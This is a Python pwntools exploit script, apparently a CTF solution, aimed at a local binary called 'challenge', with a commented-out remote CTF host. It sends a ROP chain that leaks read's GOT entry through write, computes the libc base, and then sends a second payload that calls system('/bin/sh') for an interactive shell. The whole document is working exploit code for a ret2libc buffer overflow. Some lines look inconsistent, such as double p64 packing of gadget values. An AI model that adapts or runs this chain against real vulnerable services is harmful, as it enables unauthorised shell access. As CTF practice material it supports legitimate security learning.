from pwn import *
import sys

# preload content
####################
context.binary = "./challenge"
binary = ELF("./challenge")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") # we "reach" into this libc file.	


# plt, got, functions, rop
write_plt	= p64(binary.symbols["write"])
read_plt	= p64(binary.symbols["read"])
read_got	= p64(binary.symbols["got.read"])
main		= p64(binary.symbols["main"])
pop_rdi = 0x4005a9
pop_rsi = 0x4005ab
pop_rdx = 0x4005ad
pop_rax = 0x4005a7

#r = remote("university.opentoallctf.com", 30002)
r = process("./challenge", env={"LD_PRELOAD": "/lib/x86_64-linux-gnu/libc.so.6"}) 
gdb.attach(r)


r.recvline()

# Memleak - write@plt memleaks read@got
payload = ""
payload += "A" * 16
payload += p64(pop_rdi)
payload += p64(0x1)
payload += p64(pop_rsi)
payload += read_got
payload += p64(pop_rdx)
payload += p64(0x8)
payload += write_plt
payload += main
payload += "A" * 16
payload += read_plt


r.send(payload)


# leak offset & calculate libc offsets
leak		= int(r.recv(8)[::-1].encode("hex"),16)
libc_base	= leak - libc.symbols["read"]
system		= int(libc_base + libc.symbols["system"])
binsh		= int(libc_base + libc.search("/bin/sh").next())


print "[+] Leak  : 0x%x" % leak
print "[+] libc  : 0x%x" % libc_base
print "[+] system: 0x%x" % system
print "[+] binsh : 0x%x" % binsh

# locate system, "/bin/sh" offsets
system	= p64(libc_base + libc.symbols["system"])
binsh	= p64(libc_base + libc.search("/bin/sh").next())

# 2nd payload
payload2 = ""
payload2 += "A" * 24		# 24 bytes because already used 16 + read_plt
payload2 += p64(pop_rdi)
payload2 += binsh
payload2 += system

r.send(payload2)
r.interactive()
